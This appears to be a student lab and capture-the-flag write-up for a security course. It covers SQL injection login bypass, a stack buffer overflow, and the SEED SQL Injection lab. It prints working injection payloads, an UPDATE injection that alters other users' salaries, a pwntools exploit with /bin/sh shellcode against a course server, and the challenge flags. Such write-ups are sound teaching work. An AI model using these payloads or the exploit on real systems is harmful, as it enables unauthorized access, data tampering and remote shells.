# Trabalho realizado na semana #8 e #9


---

## CTF 


### Week 8 - Challenge 1

After analyzing the index.php file, we notice that this line is vulnerable to a SQL injection attack. 

![](https://i.imgur.com/UvwO3PI.png)

By filling the form with the following input, it was possible to login as `admin`.

```
username: admin';--
password: anything
```
Our strategy was to use `--` which creates a comment in SQL. By doing this, it is not necessary to write in the password field.

![](https://i.imgur.com/5yEv8YM.png)

Flag:

```
flag{94007faac7bd8b7b6681291878980fc1}
```

### Week 8 - Challenge 2

After executing <kbd>checksec program</kbd> we got the following output:

![](https://i.imgur.com/rUstDS0.png)

After analyzing main.c we realized that this was a buffer overflow attack.  So we want to overwrite the return address of the function. When it returns this address, it will execute the code that is at that address by executing it in the shellcode.

To do this, we start by taking the value of the buffer address (of 100 bytes) and transform the corresponding shellcode, in hexadecimal, into an array of bytes.

Then we create a variable *fp*, frame pointer, which represents the 8 bytes of the stack, which are after the buffer. So we initialize the variable with eight 0's in hexadecimal. Finally we create the string that will be sent to the exploit and construct the final string to be sent, the shellcode followed by the string created earlier.

Using the following code, we are able to accomplish this:

```
from pwn import *

DEBUG = False

if DEBUG:
    p = process("./program")
    pause()
else:
    p = remote("ctf-fsi.fe.up.pt", 4001)

txt = p.recvuntil(b":").decode()
addr = re.search('0x(.+?).\n',txt).group(1) 

buf = bytearray.fromhex(addr)
buf.reverse()

shellcode= bytearray.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80")
fp= bytearray.fromhex("0"*8)
finalString = b"a"*77 + fp*2 + buf

p.sendline(shellcode + finalString)
p.interactive()
```

Finally, we ran it and using the command <kbd> cat flag.txt </kbd> we get the flag.

![](https://i.imgur.com/sE4z2RY.png)


flag:
```
flag{324a995576262f6f5563aa6f3908b45a}
```

## SQL Injection Attack Lab

### Task 1

After running the following SQL command:

```
SELECT * FROM credentials WHERE name='Alice';
```

The following information about Alice was provided:

![](https://i.imgur.com/Y0tHPjq.png)

### Task 2 

#### 2.1

Due to a vulnerability in the following code: 

![](https://i.imgur.com/Xi0VK2q.png)

We can manipulate the admin authentication using the following input:

```
username = admin'; #
password = anything
```

This will cause the string to be closed leaving the rest of the code commented before the password input:

```
WHERE name='admin'; #' and Password='$hashed_pwd'" 
```

This will allow us to log in without a password:

![](https://i.imgur.com/oFyBsqO.png)


#### 2.2

We can log into the web application using the following command line:

```
'www.seed-server.com/unsafe_home.php?username=admin%27%3B%23&Password=11'
```
In hexadecimal:

- %27 -> ' 
- %3B -> ;
- %23 -> #

This will provide the same result:

![](https://i.imgur.com/dHHjDCO.png)


#### 2.3

There is a countermeasure implemented in unsafe_home.php which is the usage of mysqli::query(), from the PHP MySQLi extension. 

This means that we cannot perform SQL injection against MySQL through this method, since the mysqli::query() API does not allow multiple queries to be run in the database server, due to the concern of potential SQL injection.

```
$conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
$result = $conn->query($sql)
```

### Task 3

#### 3.1

Due to a vulnerability in the following code:

![](https://i.imgur.com/S72KTHE.png)

We can manipulate the the edit page. 

Firstly we logged in as Alice using <kbd>alice';#</kbd> where we found the edit profile page and updated the nickname field with the following code:

![](https://i.imgur.com/IatjOF7.png)

This will change alice's salary to 30000:

```
(...)
nickname='', salary='30000' ,email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id;"
(...)
```

Alice's profile after:

![](https://i.imgur.com/1245SJY.png)



#### 3.2

In order to change Boby's salary using Alice's profile we used the following code:

```
', salary = '1' where name='boby';#
```

This will change Boby's salary to 1 since the # at the end hides the query related to Alice:

```
(...)
nickname='', salary='1' where name='boby'; # ,email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id;"
(...)
```

After this we logged in as admin where we can see all the employee information and confirm Boby's salary was altered:

![](https://i.imgur.com/qtPMuzr.png)

